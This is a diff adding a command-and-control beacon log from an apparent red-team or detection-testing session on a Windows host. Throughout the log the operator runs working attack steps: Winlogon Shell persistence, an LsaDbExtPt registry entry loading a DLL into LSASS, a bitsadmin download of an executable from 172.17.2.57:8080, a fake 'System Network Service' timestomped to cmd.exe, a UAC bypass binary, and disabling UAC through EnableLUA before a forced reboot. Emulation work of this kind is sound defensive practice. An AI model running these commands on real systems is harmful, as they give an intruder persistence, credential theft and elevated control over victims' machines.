@@ -1,0 +1,538 @@
+02/07 09:42:38 [task] 设置Winlogon 加载项
+02/07 09:42:38 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 09:42:38 [task] cd c:\RedTeam\
+02/07 09:42:38 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004.exe as T1004.exe
+02/07 09:42:38 [indicator] file: 831f1d4371b45054367da9c1df9075ae 7680 bytes T1004.exe
+02/07 09:42:38 [task] Tasked beacon to run: C:\RedTeam\T1004.exe
+02/07 09:43:24 [checkin] host called home, sent: 7790 bytes
+02/07 09:43:25 [output]
+received output:
+
+
+PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\M
+               icrosoft\Windows NT\CurrentVersion\Winlogon
+PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\M
+               icrosoft\Windows NT\CurrentVersion
+PSChildName  : Winlogon
+PSDrive      : HKCU
+PSProvider   : Microsoft.PowerShell.Core\Registry
+Shell        : Explorer.exe,c:\\RedTeam\\pwd.exe
+
+
+
+
+
+02/07 10:28:32 [task] 设置Winlogon 加载项
+02/07 10:28:32 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 10:28:32 [task] cd c:\RedTeam\
+02/07 10:28:32 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004.exe as T1004.exe
+02/07 10:28:32 [indicator] file: 57e4a64837b3946e77b1fdefa250387a 7680 bytes T1004.exe
+02/07 10:28:32 [task] Tasked beacon to run: C:\RedTeam\T1004.exe
+02/07 10:29:27 [checkin] host called home, sent: 7790 bytes
+02/07 10:29:29 [output]
+received output:
+操作成功完成。
+
+
+02/07 10:35:47 [task] 设置Winlogon 加载项
+02/07 10:35:47 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 10:35:47 [task] cd c:\RedTeam\
+02/07 10:35:47 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004.exe as T1004.exe
+02/07 10:35:47 [indicator] file: be869c4c72903e218f3136240d99d16f 7680 bytes T1004.exe
+02/07 10:35:47 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 10:35:47 [task] cd c:\RedTeam\
+02/07 10:35:47 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004_2.exe as T1004_2.exe
+02/07 10:35:47 [indicator] file: 4acfdebd64f7fe2efc41324f12060a70 7680 bytes T1004_2.exe
+02/07 10:35:47 [task] Tasked beacon to run: C:\RedTeam\T1004_2.exe
+02/07 10:36:29 [checkin] host called home, sent: 15533 bytes
+02/07 10:36:30 [output]
+received output:
+'C:RedTeamT1004.exe' 不是内部或外部命令，也不是可运行的程序
+或批处理文件。
+
+
+02/07 10:37:11 [task] 设置Winlogon 加载项
+02/07 10:37:11 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 10:37:11 [task] cd c:\RedTeam\
+02/07 10:37:11 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004.exe as T1004.exe
+02/07 10:37:11 [indicator] file: be869c4c72903e218f3136240d99d16f 7680 bytes T1004.exe
+02/07 10:37:11 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 10:37:11 [task] cd c:\RedTeam\
+02/07 10:37:11 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004_2.exe as T1004_2.exe
+02/07 10:37:11 [indicator] file: c4f9a4268fa5db7a2dde3692d09cf4f6 7680 bytes T1004_2.exe
+02/07 10:37:11 [task] Tasked beacon to run: C:\RedTeam\T1004_2.exe
+02/07 10:37:30 [checkin] host called home, sent: 15533 bytes
+02/07 10:37:31 [output]
+received output:
+操作成功完成。
+
+
+02/07 10:52:26 [task] 设置Winlogon 加载项
+02/07 10:52:26 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 10:52:26 [task] cd c:\RedTeam\
+02/07 10:52:26 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004.exe as T1004.exe
+02/07 10:52:26 [indicator] file: 390249d04d25cf9ae63fe8b6ed086593 7680 bytes T1004.exe
+02/07 10:52:26 [task] Tasked beacon to run: C:\RedTeam\T1004.exe
+02/07 10:52:32 [checkin] host called home, sent: 7790 bytes
+02/07 10:54:45 [task] 设置Winlogon 加载项
+02/07 10:54:45 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 10:54:45 [task] cd c:\RedTeam\
+02/07 10:54:45 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004.exe as T1004.exe
+02/07 10:54:45 [indicator] file: 390249d04d25cf9ae63fe8b6ed086593 7680 bytes T1004.exe
+02/07 10:54:45 [task] Tasked beacon to run: C:\RedTeam\T1004.exe
+02/07 10:55:33 [checkin] host called home, sent: 7790 bytes
+02/07 10:57:29 [task] 设置Winlogon 加载项
+02/07 10:57:29 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 10:57:29 [task] cd c:\RedTeam\
+02/07 10:57:29 [task] Tasked beacon to run: C:\RedTeam\T1004(2).exe
+02/07 10:57:33 [checkin] host called home, sent: 92 bytes
+02/07 10:58:53 [task] 设置Winlogon 加载项
+02/07 10:58:53 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 10:58:53 [task] cd c:\RedTeam\
+02/07 10:58:53 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004_2.exe as T1004_2.exe
+02/07 10:58:53 [indicator] file: 42feff7affbe919e7617174407abb22e 7680 bytes T1004_2.exe
+02/07 10:58:53 [task] Tasked beacon to run: C:\RedTeam\T1004_2.exe
+02/07 10:59:33 [checkin] host called home, sent: 7794 bytes
+02/07 10:59:54 [input] <neo> calc
+02/07 10:59:54 [error] Unknown command: calc
+02/07 10:59:58 [input] <neo> shell calc
+02/07 10:59:58 [task] Tasked beacon to run: calc
+02/07 11:00:33 [checkin] host called home, sent: 35 bytes
+02/07 11:01:52 [task] 设置Winlogon 加载项
+02/07 11:01:52 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 11:01:52 [task] cd c:\RedTeam\
+02/07 11:01:52 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004.exe as T1004.exe
+02/07 11:01:52 [indicator] file: 390249d04d25cf9ae63fe8b6ed086593 7680 bytes T1004.exe
+02/07 11:01:52 [task] Tasked beacon to run: C:\RedTeam\T1004.exe
+02/07 11:02:43 [checkin] host called home, sent: 7790 bytes
+02/07 11:03:26 [input] <neo> shell c:\RedTeam\T1004.exe
+02/07 11:03:26 [task] Tasked beacon to run: c:\RedTeam\T1004.exe
+02/07 11:03:43 [checkin] host called home, sent: 51 bytes
+02/07 11:08:20 [task] 设置Winlogon 加载项
+02/07 11:08:20 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 11:08:20 [task] cd c:\RedTeam\
+02/07 11:08:20 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004.exe as T1004.exe
+02/07 11:08:20 [indicator] file: 390249d04d25cf9ae63fe8b6ed086593 7680 bytes T1004.exe
+02/07 11:08:20 [task] Tasked Beacon to execute: C:\RedTeam\T1004.exe in a high integrity context
+02/07 11:08:43 [checkin] host called home, sent: 83099 bytes
+02/07 11:08:44 [output]
+received output:
+[-] You're already in a high integrity context.
+
+02/07 11:37:32 [task] 4*************LSA Disver************
+02/07 11:37:32 [task] 添加键值
+02/07 11:37:32 [task] Tasked beacon to run: Remove-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt
+02/07 11:37:32 [task] Tasked beacon to run: new-ItemProperty  -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value '"c:\temp\lsass_lib.dll","\\share\lulz\lsass_lib.dll"'
+02/07 11:37:44 [checkin] host called home, sent: 750 bytes
+02/07 11:37:45 [output]
+received output:
+
+
+PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\Cu
+               rrentControlSet\Services\NTDS
+PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\Cu
+               rrentControlSet\Services
+PSChildName  : NTDS
+PSDrive      : HKLM
+PSProvider   : Microsoft.PowerShell.Core\Registry
+LsaDbExtPt   : "c:\temp\lsass_lib.dll","\\share\lulz\lsass_lib.dll"
+
+
+
+
+
+02/07 13:32:32 [task] Tasked beacon to run: bitsadmin /create addfile
+02/07 13:32:32 [task] Tasked beacon to run: bitsadmin /addfile addfile http://172.17.2.57:8080/test_1197.exe  c:\RedTeam\test.exe
+02/07 13:32:32 [task] Tasked beacon to run: bitsadmin /RESUME addfile
+02/07 13:32:32 [task] Tasked beacon to run: bitsadmin /complete addfile
+02/07 13:32:48 [checkin] host called home, sent: 688 bytes
+02/07 13:32:50 [output]
+received output:
+
+BITSADMIN version 3.0 [ 7.5.7601 ]
+BITS administration utility.
+(C) Copyright 2000-2006 Microsoft Corp.
+
+BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
+Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.
+
+Created job {A5ABC407-6C4B-4E37-9AD5-7F107AD141DD}.
+
+
+02/07 13:32:50 [output]
+received output:
+
+BITSADMIN version 3.0 [ 7.5.7601 ]
+BITS administration utility.
+(C) Copyright 2000-2006 Microsoft Corp.
+
+BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
+Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.
+
+Unable to add file to job - 0x800704dd
+因为用户未登录到网络，因此未执行所要求的操作。指定的服务不存在。
+
+
+
+02/07 13:32:50 [output]
+received output:
+
+BITSADMIN version 3.0 [ 7.5.7601 ]
+BITS administration utility.
+(C) Copyright 2000-2006 Microsoft Corp.
+
+BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
+Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.
+
+Unable to resume job - 0x80200003
+此作业没有附属文件。请将文件附属在此作业，然后再试一次。
+
+
+
+02/07 13:32:50 [output]
+received output:
+
+BITSADMIN version 3.0 [ 7.5.7601 ]
+BITS administration utility.
+(C) Copyright 2000-2006 Microsoft Corp.
+
+BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
+Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.
+
+Job completed.
+
+
+02/07 13:42:03 [task] Tasked beacon to run: bitsadmin /create addfile
+02/07 13:42:03 [task] Tasked beacon to run: bitsadmin /addfile addfile http://172.17.2.57:8080/test_1197.exe  c:\RedTeam\test.exe
+02/07 13:42:03 [task] Tasked beacon to run: bitsadmin /RESUME addfile
+02/07 13:42:03 [task] Tasked beacon to run: bitsadmin /complete addfile
+02/07 13:42:50 [checkin] host called home, sent: 688 bytes
+02/07 13:42:51 [output]
+received output:
+
+BITSADMIN version 3.0 [ 7.5.7601 ]
+BITS administration utility.
+(C) Copyright 2000-2006 Microsoft Corp.
+
+BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
+Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.
+
+Created job {E17DC4D2-05FF-481C-9B99-CA3CD52EA5D6}.
+
+
+02/07 13:42:51 [output]
+received output:
+
+BITSADMIN version 3.0 [ 7.5.7601 ]
+BITS administration utility.
+(C) Copyright 2000-2006 Microsoft Corp.
+
+BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
+Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.
+
+Unable to add file to job - 0x800704dd
+因为用户未登录到网络，因此未执行所要求的操作。指定的服务不存在。
+
+
+
+02/07 13:42:51 [output]
+received output:
+
+BITSADMIN version 3.0 [ 7.5.7601 ]
+BITS administration utility.
+(C) Copyright 2000-2006 Microsoft Corp.
+
+BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
+Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.
+
+Unable to resume job - 0x80200003
+此作业没有附属文件。请将文件附属在此作业，然后再试一次。
+
+
+
+02/07 13:42:51 [output]
+received output:
+
+BITSADMIN version 3.0 [ 7.5.7601 ]
+BITS administration utility.
+(C) Copyright 2000-2006 Microsoft Corp.
+
+BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
+Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.
+
+Job completed.
+
+
+02/07 14:26:14 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
+02/07 14:26:14 [task] cd c:\windows\system32
+02/07 14:26:14 [task] Tasked beacon to timestomp netsrv.exe to cmd.exe
+02/07 14:26:14 [task] Tasked beacon to run: sc delete netsrv
+02/07 14:26:14 [task] Tasked beacon to run: sc create netsrv binPath= "C:\windows\system32\netsrv.exe" start= auto DisplayName= "System Network Service"
+02/07 14:26:14 [task] Tasked beacon to run: sc start netsrv
+02/07 14:26:51 [checkin] host called home, sent: 292 bytes
+02/07 14:26:52 [error] could not set file time: 6
+02/07 14:26:52 [output]
+received output:
+[SC] OpenService 失败 1060:
+
+指定的服务未安装。
+
+
+
+02/07 14:26:52 [output]
+received output:
+[SC] CreateService 成功
+
+
+02/07 14:26:52 [output]
+received output:
+[SC] StartService 失败 2:
+
+系统找不到指定的文件。
+
+
+
+02/07 15:34:11 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
+02/07 15:34:11 [task] cd c:\windows\system32
+02/07 15:34:12 [task] Tasked beacon to timestomp netsrv.exe to cmd.exe
+02/07 15:34:12 [task] Tasked beacon to run: sc delete netsrv
+02/07 15:34:12 [task] Tasked beacon to run: sc create netsrv binPath= "C:\windows\system32\netsrv.exe" start= auto DisplayName= "System Network Service"
+02/07 15:34:12 [task] Tasked beacon to run: sc start netsrv
+02/07 15:34:52 [checkin] host called home, sent: 292 bytes
+02/07 15:34:53 [error] could not set file time: 6
+02/07 15:34:53 [output]
+received output:
+[SC] DeleteService 成功
+
+
+02/07 15:34:53 [output]
+received output:
+[SC] CreateService 成功
+
+
+02/07 15:34:53 [output]
+received output:
+[SC] StartService 失败 2:
+
+系统找不到指定的文件。
+
+
+
+02/07 15:36:50 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
+02/07 15:36:50 [task] cd c:\windows\system32
+02/07 15:36:50 [task] Tasked beacon to timestomp netsrv.exe to cmd.exe
+02/07 15:36:50 [task] Tasked beacon to run: sc delete netsrv
+02/07 15:36:50 [task] Tasked beacon to run: sc create netsrv binPath= "C:\windows\system32\netsrv.exe" start= auto DisplayName= "System Network Service"
+02/07 15:36:50 [task] Tasked beacon to run: sc start netsrv
+02/07 15:36:53 [checkin] host called home, sent: 292 bytes
+02/07 15:36:53 [error] could not set file time: 6
+02/07 15:36:53 [output]
+received output:
+[SC] DeleteService 成功
+
+
+02/07 15:36:53 [output]
+received output:
+[SC] CreateService 成功
+
+
+02/07 15:36:53 [output]
+received output:
+[SC] StartService 失败 2:
+
+系统找不到指定的文件。
+
+
+
+02/07 15:42:59 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
+02/07 15:42:59 [task] cd c:\windows\system32
+02/07 15:42:59 [task] Tasked beacon to timestomp netsrv.exe to cmd.exe
+02/07 15:42:59 [task] Tasked beacon to run: sc delete netsrv
+02/07 15:42:59 [task] Tasked beacon to run: sc create netsrv binPath= "C:\windows\system32\netsrv.exe" start= auto DisplayName= "System Network Service"
+02/07 15:42:59 [task] Tasked beacon to run: sc start netsrv
+02/07 15:43:53 [checkin] host called home, sent: 292 bytes
+02/07 15:43:53 [error] could not set file time: 6
+02/07 15:43:53 [output]
+received output:
+[SC] DeleteService 成功
+
+
+02/07 15:43:53 [output]
+received output:
+[SC] CreateService 成功
+
+
+02/07 15:43:53 [output]
+received output:
+[SC] StartService 失败 2:
+
+系统找不到指定的文件。
+
+
+
+02/07 15:48:10 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
+02/07 15:48:10 [task] cd c:\windows\system32
+02/07 15:48:10 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 15:48:10 [task] cd c:\RedTeam\
+02/07 15:48:10 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\netsrv.exe as netsrv.exe
+02/07 15:48:10 [indicator] file: 715f0098355935eaef5d56e0822c82f2 9216 bytes netsrv.exe
+02/07 15:48:10 [task] Tasked Beacon to execute: copy C:\RedTeam\netsrv.exe C:\Windows\System32\netsrv in a high integrity context
+02/07 15:48:10 [task] Tasked beacon to timestomp netsrv.exe to cmd.exe
+02/07 15:48:10 [task] Tasked beacon to run: sc delete netsrv
+02/07 15:48:10 [task] Tasked beacon to run: sc create netsrv binPath= "C:\ReadTeam\netsrv.exe" start= auto DisplayName= "System Network Service"
+02/07 15:48:10 [task] Tasked beacon to run: sc start netsrv
+02/07 15:48:53 [checkin] host called home, sent: 84986 bytes
+02/07 15:48:54 [output]
+received output:
+[-] You're already in a high integrity context.
+
+02/07 15:48:54 [output]
+received output:
+[SC] DeleteService 成功
+
+
+02/07 15:48:54 [output]
+received output:
+[SC] CreateService 成功
+
+
+02/07 15:48:54 [output]
+received output:
+[SC] StartService 失败 2:
+
+系统找不到指定的文件。
+
+
+
+02/07 15:53:09 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
+02/07 15:53:09 [task] cd c:\windows\system32
+02/07 15:53:09 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 15:53:09 [task] cd c:\RedTeam\
+02/07 15:53:09 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\netsrv.exe as netsrv.exe
+02/07 15:53:09 [indicator] file: 715f0098355935eaef5d56e0822c82f2 9216 bytes netsrv.exe
+02/07 15:53:09 [task] Tasked Beacon to execute: copy C:\RedTeam\netsrv.exe C:\Windows\System32\netsrv in a high integrity context
+02/07 15:53:09 [task] Tasked beacon to timestomp netsrv.exe to cmd.exe
+02/07 15:53:09 [task] Tasked beacon to run: sc delete netsrv
+02/07 15:53:09 [task] Tasked beacon to run: sc create netsrv binPath= "C:\ReadTeam\netsrv.exe" start= auto DisplayName= "System Network Service"
+02/07 15:53:09 [task] Tasked beacon to run: sc start netsrv
+02/07 15:53:54 [checkin] host called home, sent: 84986 bytes
+02/07 15:53:55 [output]
+received output:
+[-] You're already in a high integrity context.
+
+02/07 15:53:55 [output]
+received output:
+[SC] DeleteService 成功
+
+
+02/07 15:53:55 [output]
+received output:
+[SC] CreateService 成功
+
+
+02/07 15:53:55 [output]
+received output:
+[SC] StartService 失败 2:
+
+系统找不到指定的文件。
+
+
+
+02/07 15:58:13 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
+02/07 15:58:13 [task] cd c:\windows\system32
+02/07 15:58:13 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 15:58:13 [task] cd c:\RedTeam\
+02/07 15:58:13 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\netsrv.exe as netsrv.exe
+02/07 15:58:13 [indicator] file: 715f0098355935eaef5d56e0822c82f2 9216 bytes netsrv.exe
+02/07 15:58:13 [task] Tasked beacon to timestomp netsrv.exe to cmd.exe
+02/07 15:58:13 [task] Tasked beacon to run: sc delete netsrv
+02/07 15:58:13 [task] Tasked beacon to run: sc create netsrv binPath= "C:\ReadTeam\netsrv.exe" start= auto DisplayName= "System Network Service"
+02/07 15:58:13 [task] Tasked beacon to run: sc start netsrv
+02/07 15:58:55 [checkin] host called home, sent: 9560 bytes
+02/07 15:58:55 [output]
+received output:
+[SC] DeleteService 成功
+
+
+02/07 15:58:55 [output]
+received output:
+[SC] CreateService 成功
+
+
+02/07 15:58:55 [output]
+received output:
+[SC] StartService 失败 2:
+
+系统找不到指定的文件。
+
+
+
+02/07 15:59:27 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
+02/07 15:59:27 [task] cd c:\windows\system32
+02/07 15:59:27 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 15:59:27 [task] cd c:\RedTeam\
+02/07 15:59:27 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\netsrv.exe as netsrv.exe
+02/07 15:59:27 [indicator] file: 715f0098355935eaef5d56e0822c82f2 9216 bytes netsrv.exe
+02/07 15:59:27 [task] Tasked beacon to timestomp C:\RedTeam\netsrv.exe to C:\Windows\System32\cmd.exe
+02/07 15:59:27 [task] Tasked beacon to run: sc delete netsrv
+02/07 15:59:27 [task] Tasked beacon to run: sc create netsrv binPath= "C:\RedTeam\netsrv.exe" start= auto DisplayName= "System Network Service"
+02/07 15:59:27 [task] Tasked beacon to run: sc start netsrv
+02/07 15:59:55 [checkin] host called home, sent: 9590 bytes
+02/07 16:00:05 [output]
+received output:
+[SC] DeleteService 成功
+
+
+02/07 16:00:05 [output]
+received output:
+[SC] CreateService 成功
+
+
+02/07 16:01:05 [output]
+received output:
+[SC] StartService 失败 1053:
+
+服务没有及时响应启动或控制请求。
+
+
+
+02/07 16:09:55 [task] 根据操作系统类型，选择不同的方式绕过uac， 会弹出高权限的计算器calc.exe
+02/07 16:09:55 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 16:09:56 [task] cd c:\RedTeam\
+02/07 16:09:56 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
+02/07 16:09:56 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
+02/07 16:09:56 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 notepad.exe
+02/07 16:10:05 [checkin] host called home, sent: 160369 bytes
+02/07 16:14:26 [task] 镜像劫持
+02/07 16:15:05 [checkin] host called home, sent: 220 bytes
+02/07 16:15:05 [output]
+received output:
+操作成功完成。
+
+c:\RedTeam>
+
+02/07 16:25:06 [checkin] host called home, sent: 186 bytes
+02/07 16:25:06 [output]
+received output:
+操作成功完成。
+
+c:\RedTeam>
+
+02/07 16:25:56 [task] 恢复
+02/07 16:26:06 [checkin] host called home, sent: 186 bytes
+02/07 16:26:06 [output]
+received output:
+错误: 系统找不到指定的注册表项或值。
+
+c:\RedTeam>
+
+02/07 16:30:35 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+02/07 16:30:35 [task] Tasked beacon to run: shutdown /r /f
+02/07 16:31:06 [checkin] host called home, sent: 233 bytes
+02/07 16:31:06 [output]
+received output:
+操作成功完成。
+
+c:\RedTeam>
+
+02/07 16:43:46 [task] Tasked beacon to run: sc delete netsrv
